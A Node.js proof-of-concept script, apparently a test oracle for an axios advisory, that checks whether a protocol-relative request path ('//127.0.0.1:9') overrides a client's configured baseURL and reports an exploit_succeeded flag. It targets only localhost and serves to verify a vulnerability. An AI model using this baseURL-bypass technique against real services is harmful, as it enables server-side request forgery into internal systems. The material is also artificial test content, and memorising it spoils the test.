let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    if (!axios || typeof axios.create !== 'function') {
      throw new Error('axios_api_unavailable');
    }

    const marker = 'ghsa-8hc4-vh64-cxmj';
    const badPort = 9;
    const client = axios.create({
      baseURL: 'http://127.0.0.1:' + String(badPort),
      timeout: 1200,
      maxRedirects: 0,
      validateStatus: function () { return true; }
    });

    let benignErr = null;
    try {
      await client.get('/' + marker + '/benign');
    } catch (e) {
      benignErr = e;
    }

    if (!benignErr) {
      throw new Error('benign_expected_network_failure_missing');
    }

    const benignCode = benignErr && benignErr.code ? String(benignErr.code) : '';
    const benignMsg = benignErr && benignErr.message ? String(benignErr.message) : '';
    const benignHadConnectFailure = benignCode.includes('ECONNREFUSED') || benignMsg.includes('ECONNREFUSED') || benignCode.includes('ECONNRESET') || benignMsg.includes('ECONNRESET');

    if (!benignHadConnectFailure) {
      throw new Error('benign_not_reaching_expected_network_path');
    }

    operation_completed = true;

    const maliciousPath = '//' + '127.0.0.1:' + String(badPort);
    let maliciousErr = null;
    try {
      await client.get(maliciousPath);
    } catch (e) {
      maliciousErr = e;
    }

    if (!maliciousErr) {
      exploit_succeeded = false;
      evidence = JSON.stringify({ marker, benignCode, benignMsg, maliciousPath, malicious: 'no_error' });
    } else {
      const mCode = maliciousErr && maliciousErr.code ? String(maliciousErr.code) : '';
      const mMsg = maliciousErr && maliciousErr.message ? String(maliciousErr.message) : '';
      const maliciousConnected = mCode.includes('ECONNREFUSED') || mMsg.includes('ECONNREFUSED') || mCode.includes('ECONNRESET') || mMsg.includes('ECONNRESET');
      exploit_succeeded = maliciousConnected;
      evidence = JSON.stringify({ marker, benignCode, benignMsg, maliciousPath, maliciousCode: mCode, maliciousMsg: mMsg, maliciousConnected });
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (err && err.message ? err.message : String(err));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();
